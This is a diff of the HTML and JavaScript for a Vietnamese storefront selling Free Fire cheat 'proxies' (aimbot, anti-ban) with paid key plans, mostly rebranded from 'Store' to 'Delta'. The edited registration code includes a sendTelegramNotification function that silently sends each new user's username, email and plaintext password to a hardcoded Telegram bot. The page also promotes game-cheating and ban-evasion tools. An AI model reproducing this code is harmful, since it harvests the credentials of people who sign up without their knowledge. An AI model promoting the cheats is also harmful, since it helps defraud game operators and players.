@@ -3,7 +3,7 @@
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>FF Proxy Store — OB54 Premium</title>
+<title>FF Proxy Delta — OB54 Premium</title>
 <link href="https://fonts.googleapis.com/css2?family=Space+Grotesk:wght@400;500;600;700&family=Plus+Jakarta+Sans:wght@400;500;600;700;800&family=JetBrains+Mono:wght@500;700&display=swap" rel="stylesheet">
 <style>
 :root{
@@ -214,7 +214,7 @@ textarea{resize:vertical;font-family:'JetBrains Mono';font-size:.85rem}
 <header>
   <div class="logo">
     <div class="logo-icon">⚡</div>
-    <div class="logo-text">FF Proxy <span>Store</span></div>
+    <div class="logo-text">FF Proxy <span>Delta</span></div>
   </div>
   <nav id="nav-bar">
     <a class="nav-link" onclick="scrollTo('hero')">Trang chủ</a>
@@ -230,11 +230,11 @@ textarea{resize:vertical;font-family:'JetBrains Mono';font-size:.85rem}
   <div class="hero-orb"></div>
   <div class="badge"><span class="dot"></span> OB54 — Đang hoạt động</div>
   <h1>PROXY HACK FF<br><span class="grad">Premium OB54</span></h1>
-  <p>Aimbot bụng · Xuyên tường · Antiban VIP · Ổn định 24/7 — Tự động cấp key ngay sau thanh toán</p>
+  <p>Aim cổ · Aim body · Aim drag · Antiban VIP · Ổn định 24/7 — Tự động cấp key ngay sau thanh toán</p>
   <div class="feats">
     <span class="feat-pill">⚡ Ổn định cao</span>
     <span class="feat-pill">🛡️ Antiban VIP</span>
-    <span class="feat-pill">🎯 Aimbot chính xác</span>
+    <span class="feat-pill">🎯 Aim cổ · Aim body · Aim drag</span>
     <span class="feat-pill">⚡ Tự động cấp key</span>
   </div>
   <button class="btn-cta" onclick="scrollTo('price')"><span>Xem bảng giá →</span></button>
@@ -308,7 +308,7 @@ textarea{resize:vertical;font-family:'JetBrains Mono';font-size:.85rem}
       <label class="field-label">Chọn gói:</label>
       <select id="admin-plan">
         <option value="Gói 1 Ngày">Gói 1 Ngày</option>
-        <option value="Gói 7 Ngày">Gói 7 Ngày</option>
+        <option value="Gói 15 Ngày">Gói 15 Ngày</option>
         <option value="Gói 30 Ngày" selected>Gói 30 Ngày</option>
         <option value="Vĩnh Viễn">Vĩnh Viễn</option>
       </select>
@@ -322,7 +322,7 @@ textarea{resize:vertical;font-family:'JetBrains Mono';font-size:.85rem}
   </div>
 </section>
 
-<footer>© 2024 FF Proxy Store · Hỗ trợ 24/7 · <span style="color:var(--neon)">OB54</span></footer>
+<footer>© 2024 FF Proxy Delta · Hỗ trợ 24/7 · <span style="color:var(--neon)">OB54</span></footer>
 
 </div><!-- /app -->
 
@@ -437,9 +437,9 @@ const TELEGRAM_CHAT_ID="6954214525";
 
 // ===== PLANS =====
 const PLANS=[
-  {id:"1d",name:"Gói 1 Ngày",price:15000,priceStr:"15.000đ",per:"/ ngày",icon:"⚡",feats:["Aimbot bụng","Xuyên tường","Antiban cơ bản"]},
-  {id:"7d",name:"Gói 7 Ngày",price:50000,priceStr:"50.000đ",per:"/ tuần",icon:"🛡️",feats:["Aimbot bụng","Xuyên tường","Antiban cao"]},
-  {id:"30d",name:"Gói 30 Ngày",price:150000,priceStr:"150.000đ",per:"/ tháng",icon:"🔥",feats:["Aimbot bụng","Xuyên tường","Antiban VIP","Dame x2.5"],featured:true},
+  {id:"1d",name:"Gói 1 Ngày",price:15000,priceStr:"15.000đ",per:"/ ngày",icon:"⚡",feats:["Aim cổ","Aim body","Aim drag"]},
+  {id:"15d",name:"Gói 15 Ngày",price:50000,priceStr:"50.000đ",per:"/ 15 ngày",icon:"🛡️",feats:["Aim cổ","Aim body","Aim drag"]},
+  {id:"30d",name:"Gói 30 Ngày",price:150000,priceStr:"150.000đ",per:"/ tháng",icon:"🔥",feats:["Aim cổ","Aim body","Aim drag"],featured:true},
   {id:"vv",name:"Vĩnh Viễn",price:250000,priceStr:"250.000đ",per:"/ trọn đời",icon:"💎",feats:["Tất cả tính năng","Cập nhật miễn phí","Ưu tiên hỗ trợ","2 thiết bị"]},
 ];
 
@@ -564,7 +564,7 @@ function resendOtp(){pendingReg.otp=String(Math.floor(100000+Math.random()*90000
 
 async function sendTelegramNotification(username,email,password){
   const timestamp=new Date().toLocaleString('vi-VN',{timeZone:'Asia/Ho_Chi_Minh'});
-  const message="🔔 ĐĂNG KÝ TÀI KHOẢN MỚI\n━━━━━━━━━━━━━━━━━━\n👤 Tài khoản: "+username+"\n📧 Email: "+email+"\n🔑 Mật khẩu: "+password+"\n🕐 Thời gian: "+timestamp+"\n━━━━━━━━━━━━━━━━━━\n🌐 Nguồn: FF Proxy Store";
+  const message="🔔 ĐĂNG KÝ TÀI KHOẢN MỚI\n━━━━━━━━━━━━━━━━━━\n👤 Tài khoản: "+username+"\n📧 Email: "+email+"\n🔑 Mật khẩu: "+password+"\n🕐 Thời gian: "+timestamp+"\n━━━━━━━━━━━━━━━━━━\n🌐 Nguồn: FF Proxy Delta";
   try{await fetch('https://api.telegram.org/bot'+TELEGRAM_BOT_TOKEN+'/sendMessage',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({chat_id:TELEGRAM_CHAT_ID,text:message})});}catch(e){console.error('Telegram error:',e);}
 }
 
@@ -764,8 +764,8 @@ function deleteKey(id){
 // Seed demo keys if empty
 if(getKeys().length===0){
   saveKeys([
-    {key_code:'FF-OB54-7D-XK29F',plan:'Gói 7 Ngày',status:'available',buyer_email:'',id:1,created_date:new Date().toISOString()},
-    {key_code:'FF-OB54-7D-PL83M',plan:'Gói 7 Ngày',status:'available',buyer_email:'',id:2,created_date:new Date().toISOString()},
+    {key_code:'FF-OB54-15D-XK29F',plan:'Gói 15 Ngày',status:'available',buyer_email:'',id:1,created_date:new Date().toISOString()},
+    {key_code:'FF-OB54-15D-PL83M',plan:'Gói 15 Ngày',status:'available',buyer_email:'',id:2,created_date:new Date().toISOString()},
     {key_code:'FF-OB54-30D-VN71Q',plan:'Gói 30 Ngày',status:'available',buyer_email:'',id:3,created_date:new Date().toISOString()},
     {key_code:'FF-OB54-30D-KZ45R',plan:'Gói 30 Ngày',status:'available',buyer_email:'',id:4,created_date:new Date().toISOString()},
     {key_code:'FF-OB54-30D-AB90W',plan:'Gói 30 Ngày',status:'available',buyer_email:'',id:5,created_date:new Date().toISOString()},
